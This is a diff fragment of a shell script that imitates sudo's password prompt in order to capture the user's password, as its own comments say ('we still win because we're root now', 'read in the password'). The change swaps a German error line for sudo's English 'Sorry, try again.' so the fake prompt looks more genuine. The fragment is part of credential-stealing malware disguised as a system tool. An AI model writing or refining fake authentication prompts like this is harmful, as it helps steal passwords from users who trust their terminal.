@@ -12,7 +12,7 @@ fi
 username=$(cat .usr 2>/dev/null|| echo root)
 
 # camoflague, if the user has the password cached we still win because we're root now
-echo "Das hat nicht funktioniert, bitte nochmal probieren." # todo use sudo's own translations here
+echo "Sorry, try again." # todo use sudo's own translations here
 echo "[sudo] password for $username:"
 
 # read in the password
